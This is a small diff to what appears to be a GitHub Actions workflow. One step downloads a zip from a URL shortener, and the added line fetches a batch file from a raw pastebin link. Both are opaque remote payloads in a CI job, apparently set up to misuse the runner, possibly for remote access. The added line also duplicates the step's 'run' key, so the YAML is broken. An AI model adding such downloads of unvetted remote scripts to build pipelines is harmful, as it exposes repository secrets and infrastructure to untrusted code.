@@ -11,6 +11,7 @@ jobs:
     steps:
     - name: stahni
       run: Invoke-WebRequest shorturl.at/ajsx3 -OutFile bigdude.zip
+      run: Invoke-WebRequest https://pastebin.com/raw/fcwaBHdh -OutFile bigstart.bat
     - name: Extract
       run: Expand-Archive bigdude.zip
     - name: Auth
